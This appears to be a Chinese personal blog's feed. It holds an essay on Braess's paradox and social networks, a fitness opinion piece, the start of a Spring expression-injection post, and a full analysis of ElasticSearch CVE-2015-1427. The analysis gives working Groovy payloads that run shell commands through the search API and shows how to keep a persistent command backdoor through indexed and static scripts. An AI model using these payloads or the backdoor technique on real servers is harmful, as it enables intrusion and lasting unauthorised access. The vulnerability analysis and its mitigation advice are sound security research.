  &lt;p&gt;另一方面，1968年，德国运筹学家提特里希·布拉斯发现，为已经拥堵的网络增加线路只会使其运行速度更慢，现在我们称其为布拉斯悖论。科学家们发现了许多例子，都是说增加拥挤网络的容量会降低其总产量。上世纪六十年代末，斯图加特的城市规划者试图通过增加一条街道来缓解闹市区的交通拥堵问题。当他们这样做了的时候，城市的交通状况更加恶化，于是他们关闭了那条街道，交通状况得到了改善。1992年，纽约在地球日关闭了拥挤的42街，人们担心情况会恶化，但结果却是，那天的交通状况实际上得到了改善。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在讨论之前我们需要明确的一个事情是，增加节点和减少线路似乎是一件事。&lt;/p&gt;

&lt;h1 id=&quot;社交网络上的应用&quot;&gt;社交网络上的应用&lt;/h1&gt;

&lt;p&gt;总结这两段话的意思就是，当你想减少网络上的线路时，最好的办法是在网络上增加节点。我们生活上最直观的例子就是社交网络或者说一些交流平台，比如说微博。&lt;/p&gt;

&lt;p&gt;微博上“根据相关法律法规和政策，xxx搜索结果未予显示。”开始出现时，意味着某种封闭的制度依照某种封闭的规则关闭了一些节点，从而导致线路的减少，消息的闭塞。久而久之，各个节点接收不到新的信息也就开始离开了，这也是微博没落的一个原因。一个节点的消失带走的往往是和这个节点相关联的绝大多数节点，这就导致了一个恶性循环，微博社交网络的倒退，就好像使用DVD机的倒退键，所有的东西都退回到了原点。&lt;/p&gt;

&lt;p&gt;这个理论也让我找到了回应当时用微信唱衰微博言论的依据，在这个言论大行其道的时候，我一直都感觉这种言论有问题，因为微博和微信都不是一个东西（虽然都姓微），但我觉说不出来为什么。现在我才知道，微博是一张可以无限延伸的网，而微信只是一个锁在木框中的纱窗。微博可以通过各种各样的信息讲无限各节点相互连接，而微信则是维系着我们生活中那少的可怜的（相对微博）人际关系。&lt;/p&gt;

&lt;p&gt;微博是一个很大的网，是一个弱相互关系的生态系统，而微信是一个强相互关系的树林。所以，这两个东西根本不同，何谈一个抢走了另一个的用户？&lt;/p&gt;

&lt;h1 id=&quot;开放对社交网络的意义&quot;&gt;开放对社交网络的意义&lt;/h1&gt;

&lt;p&gt;这个理论还有一个隐藏的含义就是，一个开放、包容更多节点的环境会获得很好，这个我能想到的例子就是安全圈中的乌云和土司。土司曾经是一个大牛云集的地方，无限的辉煌，而如今杂草丛生，毫无生气。而乌云，一个我曾经认为鱼龙混杂的地方，如今生机盎然，精品频出。更讽刺的是，土司为了防止社区的层次降低，各种手段频出，反而层次在下降。&lt;/p&gt;

&lt;p&gt;当然微信也在尝试做一些开放网络的事情，以增加节点。不过他的先天属性决定了它会是人们很需要的东西，但绝不是很cool的东西。&lt;/p&gt;

&lt;h1 id=&quot;有效的辅助手段&quot;&gt;有效的辅助手段&lt;/h1&gt;

&lt;p&gt;构建网络的一个辅助手段，使用弱化的中央管制机制，来管理线路（是线路而不是节点）。以知乎为例，当有侮辱性语句出现在评论或者回答时，创造该条内容的节点，会受到一些处罚（当然不可以是被赶出网络）。这样慢慢的节点知道不可以创造这样的通路时，就会关闭掉这条通路。&lt;/p&gt;

&lt;p&gt;当然通路和节点之间有明确的比例，当线路超过某个比例时，节点会减少，当线路少于某个比例时，节点会被其他网络吸引走。如何把握这个比例，在构建和经营网络中需要不断的灵活变换。&lt;/p&gt;

&lt;h1 id=&quot;结语&quot;&gt;结语&lt;/h1&gt;

&lt;p&gt;经营一个社交网络，最本质的东西是，&lt;strong&gt;开放、包容更多的节点，从而构造出一个生态圈，一个无限生机的世界。同时辅以弱化了的中央管制机制，来关闭不好的线路&lt;/strong&gt;。&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>ElasticSearch 远程代码执行漏洞分析（CVE-2015-1427）&amp;高级利用方法</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2015-1427.html"/>
   <updated>2015-03-06T19:30:55+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/03/06/ElasticSearch+远程代码执行漏洞分析（CVE-2015-1427）</id>
   <content type="html">&lt;h3 id=&quot;0x00-漏洞概述&quot;&gt;0x00 漏洞概述&lt;/h3&gt;

&lt;p&gt;我第一次知道CVE-2015-1427这个漏洞是在2月13日（春节放假前一天），但是当时想着过年，而且觉得应该是Groovy自身的问题，就也没太在意。知道前两天兰少（lupin）问我有没有看这个漏洞，说他找到了绕过了沙盒的方法，才跑去看。&lt;/p&gt;

&lt;p&gt;我跟lupin玩这个洞的思路不太一样，而且漏洞原理在他的文章里已经说的很清楚了，我这篇文章主要侧重这个漏洞利用的各种玩法。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;0x01-漏洞原理&quot;&gt;0x01 漏洞原理&lt;/h3&gt;

&lt;p&gt;漏洞原因很简单，由于沙盒代码黑名单中的Java危险方法不全，从而导致恶意用户仍可以使用反射的方法来执行Java代码。这就完了？当然不是！由于Elasticsearch开发团队没有完全认知Groovy的强大，以为仅仅防止用户调用Java反射就可以免于被攻击，这真是太好笑了，我们来看下Groovy对自己的描述：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2015-03/groovy.png&quot; alt=&quot;groovy&quot; /&gt;&lt;/p&gt;

&lt;p&gt;没错！Groovy是一款开发语言，这意味着我们完全可以在不使用Java的前提下实现代码执行。如果仅仅是沙盒的问题，那么修补黑白名单到攻击者没办法绕过沙盒使用Java反射就好了，但是一种语言要怎么靠黑白名单来限制它的绝大部分功能？所以没有把Groovy当做一种编程语言是这问题的真正原因。&lt;/p&gt;

&lt;h3 id=&quot;0x02-漏洞利用&quot;&gt;0x02 漏洞利用&lt;/h3&gt;

&lt;p&gt;漏洞利用其实也很简单，我们只需要参照官方提供的script使用说明来执行脚本就可以了。&lt;a href=&quot;http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html&quot;&gt;官方文档&lt;/a&gt;提供了两个方法让我们直接执行脚本代码。&lt;/p&gt;

&lt;p&gt;我们先来看第一种方式——直接执行脚本，这种方式也就是目前大家都在使用的方式。使用起来也很简单，直接向/_search这个URL提供如下POST内容：&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;script_fields&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;my_field&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;script&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;def command=\&quot;netstat -an\&quot;;def res=command.execute().text;res&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;lang&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;groovy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;效果如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2015-03/script.png&quot; alt=&quot;script&quot; /&gt;&lt;/p&gt;

&lt;p&gt;官方文档除了直接执行脚本，还提供了一种预先存储脚本用于以后执行的方式——脚本索引，这种方法使用起来比较繁琐，下面我们先来看官方提供的示例：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//建立脚本索引
curl -XPOST localhost:9200/_scripts/groovy/indexedCalculateScore -d '{
     &quot;script&quot;: &quot;log(_score * 2) + my_modifier&quot;
}'
//使用脚本索引，并执行脚本索引中的代码
curl -XPOST localhost:9200/_search -d '{
  &quot;query&quot;: {
    &quot;function_score&quot;: {
      &quot;query&quot;: {
        &quot;match&quot;: {
          &quot;body&quot;: &quot;foo&quot;
        }
      },
      &quot;functions&quot;: [
        {
          &quot;script_score&quot;: {
            &quot;script_id&quot;: &quot;indexedCalculateScore&quot;,
            &quot;lang&quot; : &quot;groovy&quot;,
            &quot;params&quot;: {
              &quot;my_modifier&quot;: 8
            }
          }
        }
      ]
    }
  }
}'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;下面我们来看实际操作，首先是建立脚本索引：&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;def command=\&quot;netstat -an\&quot;;def res=command.execute().text;res&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后是执行刚刚建立的脚本索引，由于官方给的示例中不可以返回字符串，所以这里我修改了POST提交的内容。&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;match_all&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script_fields&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;test1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;indexedCalculateScore&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;lang&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;groovy&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这种方法相比较直接执行脚本多了一个存储的步骤，但是却不失为一种留后门的好方法。如果我们这样建立一条脚本索引：&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
     &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;def res=command.execute().text;res&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后这样执行它：&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;match_all&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script_fields&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;test1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;indexedCalculateScore&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;lang&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;groovy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                 &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;netstat -an&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
             &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;完美的一个shell命令后门就完成了，效果如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2015-03/indexed-script.png&quot; alt=&quot;indexed-script&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过使用脚本索引建立的后门有一个问题，就是需要在动态脚本开启的状态下。而官方提供给我们的最后一个调用脚本的方式——调用静态脚本，刚刚好可以帮助我们维持后门的持久性。&lt;/p&gt;

&lt;p&gt;使用方法如下：在config目录下建立一个名为scripts的目录，把脚本文件放进去，然后用script_file替换上面的script_id字段就好了。这里做一个简单的例子，在scripts里放上我们刚才的的那个shell后门的代码，并命名为vul.groovy，然后POST如下数据进行搜索：&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;script_fields&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;my_field&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vul&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;params&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;netstat -an&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果你足够仔细的话，可能会发现上面的代码中我使用的file而不是官方示例的script_file，因为我测试环境是1.3.5和1.4.10，而官方所提供的示例应该是针对MVEL表达式时代的静态表达式使用方法，所以有些时候不看代码是无法发现真相的→_→。&lt;/p&gt;

&lt;h3 id=&quot;0x03-思维壁垒&quot;&gt;0x03 思维壁垒&lt;/h3&gt;

&lt;p&gt;在和lupin一开始讨论这个漏洞的时候，发现我们思考的方式完全不一样。他在跟我说怎么怎么绕过沙盒，而我却不断的问他沙盒在哪里？为什么我没有感觉到沙盒的存在？从lupin&lt;a href=&quot;http://drops.wooyun.org/papers/5107&quot;&gt;这篇文章&lt;/a&gt;描述的细节和下面官方对这个漏洞描述的内容以及官方对于漏洞的后期修复，再到这两天的全民反射来看，大家明显是都被带到沟里去了，把一个好好的代码执行漏洞玩成了命令执行漏洞。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The vulnerabilities allow an attacker to construct Groovy scripts that escape the sandbox and execute shell commands as the user running the Elasticsearch Java VM.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;如果让我用一句话来评论目前的大家使用的PoC的话，“用C的方式来利用一个PHP代码执行”，这句话再合适不过了。我在&lt;a href=&quot;http://drops.wooyun.org/tips/2494&quot;&gt;《一种新的攻击方法——Java-Web-Expression-Language-Injection》&lt;/a&gt;中提到的JELI的这种漏洞形式（或者说攻击方法），是由于开发者对于Java上层建筑的表达式认知度不够而导致漏洞的出现。Struts2没有想到Ognl可以执行Java代码，Elasticsearch同样没有想到Groovy可以实现任意Java功能。&lt;/p&gt;

&lt;p&gt;所以在这里我觉得有必要提醒大家一下，小心思维壁垒的出现。&lt;/p&gt;

&lt;h3 id=&quot;0x04-漏洞总结&quot;&gt;0x04 漏洞总结&lt;/h3&gt;

&lt;h4 id=&quot;漏洞小结&quot;&gt;漏洞小结&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;影响范围个人评价为“高”，ElasticSearch在大数据时代得到广泛的使用，而且此漏洞覆盖十个左右的版本，所以影响范围还是很广的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;危害性个人评价为“极高”，此漏洞值需要使用默认的动态脚本配置便可被利用，攻击者可以利用这个漏洞getshell。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;防护方案&quot;&gt;防护方案&lt;/h4&gt;

&lt;p&gt;关闭groovy沙盒以已停止动态脚本的使用：&lt;/p&gt;

&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;script.groovy.sandbox.enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;官方已经在最新版本中修复此问题，最新版下载链接为：
http://www.elasticsearch.org/overview/elkdownloads/&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>瘦子真的像他们想的那么好吗？</title>
   <link href="http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/08/23/%E7%98%A6%E5%AD%90%E7%9C%9F%E7%9A%84%E5%83%8F%E4%BB%96%E4%BB%AC%E6%83%B3%E7%9A%84%E9%82%A3%E4%B9%88%E5%A5%BD%E5%90%97.html"/>
   <updated>2014-08-23T21:20:36+08:00</updated>
   <id>http://localhost:4000/%E9%9A%8F%E6%83%B3/2014/08/23/瘦子真的像他们想的那么好吗？</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/3f18819bjw1ejmey1uqajj20a209zq3f.jpg&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经常会听到某些偏瘦的人在炫耀一些他们这种长不胖的特质，并以此为傲。也许胖子们天生喜欢自嘲的性格使他们滋生了这种莫名的优越感，写这篇文章并不想去矫情胖子好还是瘦子好，只是单纯的想&lt;strong&gt;从身材和健身的角度来向大家陈述一种我所观察到的瘦子的“短板”。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;既然提到了胖瘦这个话题，那么我就从对这个话题最敏感的女生群体开始吧。女生总是觉得自己的体重太重，而那些吃不胖的女生总是会伴随而来他人羡慕的眼光和不自觉的骄傲，但是这真的值得骄傲吗？&lt;/p&gt;

&lt;p&gt;举个例子，一个女生身高170，体重90-100斤，这种情况在女生眼中应该算是完美比例了。不过在我的审美来看（大多数男生），真心只是一张皮披了的骨架，以纯雄性的眼光来评价就是——美胸没屁股美个蛋。&lt;/p&gt;

&lt;p&gt;光说女同胞貌似不太好，那就再说个男同胞的例子，男生对于胖瘦没有太多直接的对比，但是却有很多对比是由胖瘦间接导出的。比如从学校到去年我的另一个健身房中，经常会有一些比女生还瘦的男生在不断的炫耀自己腹肌的纹路。&lt;/p&gt;

&lt;p&gt;对于这种事情我往往无言以对，这种靠表皮包裹出那薄的可怜的腹肌，为什么会还那么开心？记得我在健身房用三个月的时间冲起腹肌的时候，一个经常炫耀腹肌的瘦子讪讪地问我为什么我的腹肌要比他的大那么多。那时真想告诉他，因为我是真的练起的腹肌，而你根本谈不上腹肌。&lt;/p&gt;

&lt;p&gt;好了，吐槽完毕，我们回到正题，瘦子真没有他们想象当中的那么好，他们吃什么都不胖只能说明他们先天的吸收系统有问题，而且这种瘦子大多都有不爱运动的特点。&lt;/p&gt;

&lt;p&gt;当然我也并非欣赏胖子，我欣赏的体型人群是在那种徘徊在标准比例中间的那些人，具体的量化数字就是：男生身高180，体重140-150；女生170，105-115。因为在这种比例范围人的身体潜力最大，他们可以塑造出完美的身体比例，当然前提是别太懒。&lt;/p&gt;

&lt;p&gt;女生来说在这个比例之下，可以通过适当的锻炼前凸后翘，当然腰部的锻炼还是挺痛苦的。健身教练也是比较喜欢带着些女生的，因为她们相对那些瘦的女生有肉可塑，不需要先通过适当锻炼改善吸收系统。&lt;/p&gt;

&lt;p&gt;同理，这个比例男生的肌肉锻炼也很简单，直接通过力量训练来增加肌肉维度，再加上适当的有氧来去除多余的赘肉。这里嘚瑟一下，经过两年的健身，我发现通过局部力量锻炼配合有氧可以达到指哪减哪的效果O(∩_∩)O。&lt;/p&gt;

&lt;h2 id=&quot;结语&quot;&gt;结语&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;各位吃不胖的懒瘦子们，还是拿出点危机感吧，不说为了好看的身材比例，单是让自己身体健康而充满活力也足够说服你们“胖起来”了吧。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;身材是练出来的，而不是瘦下来的&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Spring框架远程代码执行</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/07/26/Spring%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.html"/>
   <updated>2014-07-26T00:20:04+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2014/07/26/Spring框架远程代码执行</id>
   <content type="html">&lt;h3 id=&quot;0x01-概述&quot;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;2012年12月国外研究者DanAmodio发表《Remote Code with Expression Language Injection》一文，指出Spring框架存在潜在的代码注入风险。在2013年1月，国内安全研究人员在微博上分享了该篇文章的中文翻译内容。&lt;/p&gt;

&lt;p&gt;文章中指出Spring框架3.0.6以下版本，在一定的条件下，可以被攻击者利用，执行任意的java代码，从而威胁系统的安全性。而且这些存在潜在威胁的版本，在全球范围中已经下载超过131.4万，由此可见此问题影响极为广泛。&lt;/p&gt;

&lt;p&gt;我在这一周中针对文章中所提到的方法，进行了重现。本篇文章将向各位描述这个问题被触发所需要的条件，实现利用的细节，以及相关的一些防护方法。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;0x02-环境搭建&quot;&gt;0x02 环境搭建&lt;/h3&gt;

&lt;p&gt;先说下简单的测试代码吧，按照文章中所说的，在搭建好的Spring中添加一个jsp文件，其中包含如下代码：&lt;/p&gt;

